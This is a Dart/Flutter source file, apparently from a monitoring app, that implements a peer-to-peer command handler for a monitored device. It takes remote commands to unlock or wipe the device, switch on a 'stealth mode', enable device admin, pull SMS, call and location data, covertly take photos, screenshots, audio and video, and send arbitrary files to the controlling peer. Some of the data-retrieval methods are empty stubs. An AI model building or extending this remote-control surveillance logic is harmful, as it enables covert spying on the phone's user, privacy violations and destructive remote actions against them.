import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/core/network/p2p_communication_service.dart';
import 'package:monitored_app/core/services/data_collector_service.dart';
import 'package:monitored_app/core/services/security_service.dart';
import 'package:monitored_app/core/services/unlock_service.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/services/battery_monitor_service.dart';
import 'package:monitored_app/app/locator.dart';
import 'package:monitored_app/core/utils/device_utils.dart';

class P2PCommandHandler {
  static final P2PCommandHandler _instance = P2PCommandHandler._internal();
  factory P2PCommandHandler() => _instance;
  P2PCommandHandler._internal();

  late P2PCommunicationService _p2pService;
  late DataCollectorService _dataCollectorService;
  late SecurityService _securityService;
  late UnlockService _unlockService;
  late StorageService _storageService;
  late BatteryMonitorService _batteryService;

  StreamSubscription? _messageSubscription;
  final Map<String, Completer<Map<String, dynamic>>> _pendingRequests = {};

  Future<void> initialize() async {
    _p2pService = P2PCommunicationService();
    _dataCollectorService = locator<DataCollectorService>();
    _securityService = locator<SecurityService>();
    _unlockService = locator<UnlockService>();
    _storageService = locator<StorageService>();
    _batteryService = locator<BatteryMonitorService>();

    await _p2pService.initialize();
    _setupMessageHandling();

    debugPrint('P2P Command Handler initialized');
  }

  void _setupMessageHandling() {
    _messageSubscription = _p2pService.globalMessageStream.listen(_handleMessage);
  }

  Future<void> _handleMessage(P2PMessage message) async {
    try {
      debugPrint('P2P Command received: ${message.type}');

      // Decrypt message if needed
      Map<String, dynamic> payload = message.payload;
      if (message.encrypted) {
        try {
          final encryptedData = payload['encrypted_data'] as String;
          final decryptedJson = await _securityService.decryptData(encryptedData);
          payload = jsonDecode(decryptedJson);
        } catch (e) {
          debugPrint('Failed to decrypt P2P message: $e');
          return;
        }
      }

      // Handle different message types
      switch (message.type) {
        case 'heartbeat':
          await _handleHeartbeat(message, payload);
          break;
        case 'device_command':
          await _handleDeviceCommand(message, payload);
          break;
        case 'data_request':
          await _handleDataRequest(message, payload);
          break;
        case 'media_capture':
          await _handleMediaCapture(message, payload);
          break;
        case 'file_request':
          await _handleFileRequest(message, payload);
          break;
        case 'security_command':
          await _handleSecurityCommand(message, payload);
          break;
        case 'emergency_response':
          await _handleEmergencyResponse(message, payload);
          break;
        case 'status_request':
          await _handleStatusRequest(message, payload);
          break;
        case 'response':
          await _handleResponse(message, payload);
          break;
        default:
          debugPrint('Unknown P2P message type: ${message.type}');
      }
    } catch (e) {
      debugPrint('Error handling P2P message: $e');
    }
  }

  Future<void> _handleHeartbeat(P2PMessage message, Map<String, dynamic> payload) async {
    // Respond to heartbeat to maintain connection
    await _sendResponse(message, 'heartbeat_response', {
      'status': 'alive',
      'timestamp': DateTime.now().toIso8601String(),
    });
  }

  Future<void> _handleDeviceCommand(P2PMessage message, Map<String, dynamic> payload) async {
    final command = payload['command'] as String?;
    if (command == null) return;

    bool success = false;
    String responseMessage = '';
    Map<String, dynamic>? responseData;

    try {
      switch (command) {
        case 'unlock_device':
          success = await _unlockService.unlockDevice();
          responseMessage = success ? 'Device unlocked successfully' : 'Failed to unlock device';
          break;

        case 'lock_device':
          final duration = payload['duration_minutes'] ?? 60;
          success = await _securityService.lockDevice(durationMinutes: duration);
          responseMessage = success ? 'Device locked successfully' : 'Failed to lock device';
          break;

        case 'restart_device':
          success = await _securityService.restartDevice();
          responseMessage = success ? 'Device restart initiated' : 'Failed to restart device';
          break;

        case 'wipe_device':
          success = await _securityService.wipeDevice();
          responseMessage = success ? 'Device wipe initiated' : 'Failed to wipe device';
          break;

        case 'enable_stealth_mode':
          success = await _securityService.enableStealthMode();
          responseMessage = success ? 'Stealth mode enabled' : 'Failed to enable stealth mode';
          break;

        case 'disable_stealth_mode':
          success = await _securityService.disableStealthMode();
          responseMessage = success ? 'Stealth mode disabled' : 'Failed to disable stealth mode';
          break;

        default:
          responseMessage = 'Unknown device command: $command';
      }
    } catch (e) {
      responseMessage = 'Error executing command: $e';
    }

    await _sendResponse(message, 'device_command_response', {
      'command': command,
      'success': success,
      'message': responseMessage,
      'data': responseData,
    });
  }

  Future<void> _handleDataRequest(P2PMessage message, Map<String, dynamic> payload) async {
    final dataType = payload['data_type'] as String?;
    final timeRange = payload['time_range'] as Map<String, dynamic>?;
    
    if (dataType == null) return;

    try {
      Map<String, dynamic> data = {};
      
      switch (dataType) {
        case 'location':
          data = await _getLocationData(timeRange);
          break;
        case 'sms':
          data = await _getSmsData(timeRange);
          break;
        case 'calls':
          data = await _getCallsData(timeRange);
          break;
        case 'apps':
          data = await _getAppsData(timeRange);
          break;
        case 'battery':
          data = await _getBatteryData(timeRange);
          break;
        case 'all':
          data = await _getAllData(timeRange);
          break;
        default:
          throw Exception('Unknown data type: $dataType');
      }

      await _sendResponse(message, 'data_response', {
        'data_type': dataType,
        'data': data,
        'timestamp': DateTime.now().toIso8601String(),
      });
    } catch (e) {
      await _sendResponse(message, 'data_response', {
        'data_type': dataType,
        'error': 'Failed to retrieve data: $e',
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  Future<void> _handleMediaCapture(P2PMessage message, Map<String, dynamic> payload) async {
    final mediaType = payload['media_type'] as String?;
    final options = payload['options'] as Map<String, dynamic>? ?? {};

    if (mediaType == null) return;

    try {
      Map<String, dynamic>? mediaData;
      
      switch (mediaType) {
        case 'screenshot':
          mediaData = await _dataCollectorService.mediaCollector.captureScreenshot();
          break;
        case 'photo':
          final frontCamera = options['front_camera'] ?? false;
          mediaData = await _dataCollectorService.mediaCollector.capturePhoto(frontCamera: frontCamera);
          break;
        case 'audio':
          final duration = options['duration_seconds'] ?? 30;
          mediaData = await _dataCollectorService.mediaCollector.recordAudio(durationSeconds: duration);
          break;
        case 'video':
          final duration = options['duration_seconds'] ?? 30;
          final frontCamera = options['front_camera'] ?? false;
          mediaData = await _dataCollectorService.mediaCollector.recordVideo(
            durationSeconds: duration,
            frontCamera: frontCamera,
          );
          break;
        default:
          throw Exception('Unknown media type: $mediaType');
      }

      await _sendResponse(message, 'media_capture_response', {
        'media_type': mediaType,
        'success': mediaData != null,
        'media_data': mediaData,
        'timestamp': DateTime.now().toIso8601String(),
      });
    } catch (e) {
      await _sendResponse(message, 'media_capture_response', {
        'media_type': mediaType,
        'success': false,
        'error': 'Failed to capture media: $e',
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  Future<void> _handleFileRequest(P2PMessage message, Map<String, dynamic> payload) async {
    final filePath = payload['file_path'] as String?;

    if (filePath == null) return;

    try {
      final file = File(filePath);
      if (!await file.exists()) {
        throw Exception('File not found: $filePath');
      }

      // Send file through P2P
      final peers = _p2pService.connectedPeers;
      if (peers.isNotEmpty) {
        final success = await _p2pService.sendFile(peers.first.peerId, filePath);
        
        await _sendResponse(message, 'file_response', {
          'file_path': filePath,
          'success': success,
          'message': success ? 'File sent successfully' : 'Failed to send file',
          'timestamp': DateTime.now().toIso8601String(),
        });
      } else {
        throw Exception('No connected peers to send file');
      }
    } catch (e) {
      await _sendResponse(message, 'file_response', {
        'file_path': filePath,
        'success': false,
        'error': 'Failed to send file: $e',
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  Future<void> _handleSecurityCommand(P2PMessage message, Map<String, dynamic> payload) async {
    final command = payload['command'] as String?;
    if (command == null) return;

    bool success = false;
    String responseMessage = '';
    
    try {
      switch (command) {
        case 'enable_admin_mode':
          success = await _securityService.enableDeviceAdmin();
          responseMessage = success ? 'Admin mode enabled' : 'Failed to enable admin mode';
          break;
          
        case 'disable_admin_mode':
          success = await _securityService.disableDeviceAdmin();
          responseMessage = success ? 'Admin mode disabled' : 'Failed to disable admin mode';
          break;
          
        case 'update_security_settings':
          final settings = payload['settings'] as Map<String, dynamic>?;
          if (settings != null) {
            success = await _securityService.updateSecuritySettings(settings);
            responseMessage = success ? 'Security settings updated' : 'Failed to update security settings';
          }
          break;
          
        case 'trigger_security_scan':
          try {
            await _securityService.performSecurityScan();
            success = true;
            responseMessage = 'Security scan completed';
          } catch (e) {
            success = false;
            responseMessage = 'Security scan failed: $e';
          }
          break;
          
        default:
          responseMessage = 'Unknown security command: $command';
      }
    } catch (e) {
      responseMessage = 'Error executing security command: $e';
    }

    await _sendResponse(message, 'security_command_response', {
      'command': command,
      'success': success,
      'message': responseMessage,
      'timestamp': DateTime.now().toIso8601String(),
    });
  }

  Future<void> _handleEmergencyResponse(P2PMessage message, Map<String, dynamic> payload) async {
    final action = payload['action'] as String?;
    if (action == null) return;

    bool success = false;
    String responseMessage = '';
    
    try {
      switch (action) {
        case 'activate_emergency':
          success = await _activateEmergencyMode();
          responseMessage = success ? 'Emergency mode activated' : 'Failed to activate emergency mode';
          break;
          
        case 'deactivate_emergency':
          success = await _deactivateEmergencyMode();
          responseMessage = success ? 'Emergency mode deactivated' : 'Failed to deactivate emergency mode';
          break;
          
        case 'send_sos':
          success = await _sendSOSSignal();
          responseMessage = success ? 'SOS signal sent' : 'Failed to send SOS signal';
          break;
          
        default:
          responseMessage = 'Unknown emergency action: $action';
      }
    } catch (e) {
      responseMessage = 'Error handling emergency response: $e';
    }

    await _sendResponse(message, 'emergency_response_result', {
      'action': action,
      'success': success,
      'message': responseMessage,
      'timestamp': DateTime.now().toIso8601String(),
    });
  }

  Future<void> _handleStatusRequest(P2PMessage message, Map<String, dynamic> payload) async {
    try {
      final deviceInfo = await DeviceUtils.getDeviceInfo();
      final batteryInfo = await _batteryService.getBatteryInfo();
      
      final status = {
        'device_info': deviceInfo,
        'battery_info': batteryInfo,
        'app_version': await DeviceUtils.getAppVersion(),
        'system_status': await _getSystemStatus(),
        'security_status': await _getSecurityStatus(),
        'data_collection_status': await _getDataCollectionStatus(),
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _sendResponse(message, 'status_response', status);
    } catch (e) {
      await _sendResponse(message, 'status_response', {
        'error': 'Failed to get status: $e',
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  Future<void> _handleResponse(P2PMessage message, Map<String, dynamic> payload) async {
    final requestId = payload['request_id'] as String?;
    if (requestId != null && _pendingRequests.containsKey(requestId)) {
      _pendingRequests[requestId]!.complete(payload);
      _pendingRequests.remove(requestId);
    }
  }

  Future<void> _sendResponse(P2PMessage originalMessage, String responseType, Map<String, dynamic> data) async {
    final peers = _p2pService.connectedPeers;
    if (peers.isEmpty) return;

    final responsePayload = {
      'request_id': originalMessage.id,
      'response_type': responseType,
      ...data,
    };

    await _p2pService.sendSecureMessage(
      peers.first.peerId,
      originalMessage.channelId ?? 'command_main',
      'response',
      responsePayload,
    );
  }

  // Data retrieval methods
  Future<Map<String, dynamic>> _getLocationData(Map<String, dynamic>? timeRange) async {
    // Implement location data retrieval
    return {
      'locations': [],
      'count': 0,
    };
  }

  Future<Map<String, dynamic>> _getSmsData(Map<String, dynamic>? timeRange) async {
    // Implement SMS data retrieval
    return {
      'messages': [],
      'count': 0,
    };
  }

  Future<Map<String, dynamic>> _getCallsData(Map<String, dynamic>? timeRange) async {
    // Implement calls data retrieval
    return {
      'calls': [],
      'count': 0,
    };
  }

  Future<Map<String, dynamic>> _getAppsData(Map<String, dynamic>? timeRange) async {
    // Implement apps data retrieval
    return {
      'apps': [],
      'count': 0,
    };
  }

  Future<Map<String, dynamic>> _getBatteryData(Map<String, dynamic>? timeRange) async {
    final batteryInfo = await _batteryService.getBatteryInfo();
    return {
      'current_battery': batteryInfo,
      'history': [],
    };
  }

  Future<Map<String, dynamic>> _getAllData(Map<String, dynamic>? timeRange) async {
    return {
      'location': await _getLocationData(timeRange),
      'sms': await _getSmsData(timeRange),
      'calls': await _getCallsData(timeRange),
      'apps': await _getAppsData(timeRange),
      'battery': await _getBatteryData(timeRange),
    };
  }

  // Emergency methods
  Future<bool> _activateEmergencyMode() async {
    try {
      await _storageService.write('emergency_mode_active', 'true');
      // Implement emergency mode activation logic
      return true;
    } catch (e) {
      debugPrint('Error activating emergency mode: $e');
      return false;
    }
  }

  Future<bool> _deactivateEmergencyMode() async {
    try {
      await _storageService.write('emergency_mode_active', 'false');
      // Implement emergency mode deactivation logic
      return true;
    } catch (e) {
      debugPrint('Error deactivating emergency mode: $e');
      return false;
    }
  }

  Future<bool> _sendSOSSignal() async {
    try {
      // Implement SOS signal sending logic
      return true;
    } catch (e) {
      debugPrint('Error sending SOS signal: $e');
      return false;
    }
  }

  // Status methods
  Future<Map<String, dynamic>> _getSystemStatus() async {
    return {
      'memory_usage': await _getMemoryUsage(),
      'storage_usage': await _getStorageUsage(),
      'network_status': await _getNetworkStatus(),
    };
  }

  Future<Map<String, dynamic>> _getSecurityStatus() async {
    return {
      'device_admin_active': await _securityService.isDeviceAdminActive(),
      'stealth_mode_active': await _securityService.isStealthModeActive(),
      'security_threats': await _securityService.getActiveThreats(),
    };
  }

  Future<Map<String, dynamic>> _getDataCollectionStatus() async {
    return {
      'location_collector_active': _dataCollectorService.isLocationCollectorActive,
      'sms_collector_active': _dataCollectorService.isSmsCollectorActive,
      'calls_collector_active': _dataCollectorService.isCallsCollectorActive,
      'apps_collector_active': _dataCollectorService.isAppsCollectorActive,
    };
  }

  Future<Map<String, dynamic>> _getMemoryUsage() async {
    // Implement memory usage retrieval
    return {'used': 0, 'total': 0, 'percentage': 0};
  }

  Future<Map<String, dynamic>> _getStorageUsage() async {
    // Implement storage usage retrieval
    return {'used': 0, 'total': 0, 'percentage': 0};
  }

  Future<Map<String, dynamic>> _getNetworkStatus() async {
    // Implement network status retrieval
    return {'connected': true, 'type': 'wifi', 'signal_strength': 100};
  }

  // Public API methods
  Future<Map<String, dynamic>?> sendCommand(String command, Map<String, dynamic> parameters) async {
    final peers = _p2pService.connectedPeers;
    if (peers.isEmpty) {
      debugPrint('No connected peers to send command');
      return null;
    }

    final requestId = _generateRequestId();
    final completer = Completer<Map<String, dynamic>>();
    _pendingRequests[requestId] = completer;

    final success = await _p2pService.sendSecureMessage(
      peers.first.peerId,
      'command_main',
      'device_command',
      {
        'request_id': requestId,
        'command': command,
        ...parameters,
      },
    );

    if (!success) {
      _pendingRequests.remove(requestId);
      return null;
    }

    // Wait for response with timeout
    try {
      return await completer.future.timeout(const Duration(seconds: 30));
    } catch (e) {
      _pendingRequests.remove(requestId);
      debugPrint('Command timeout: $command');
      return null;
    }
  }

  String _generateRequestId() {
    return 'req_${DateTime.now().millisecondsSinceEpoch}_${(DateTime.now().microsecond % 1000)}';
  }

  void dispose() {
    _messageSubscription?.cancel();
    _pendingRequests.clear();
  }
}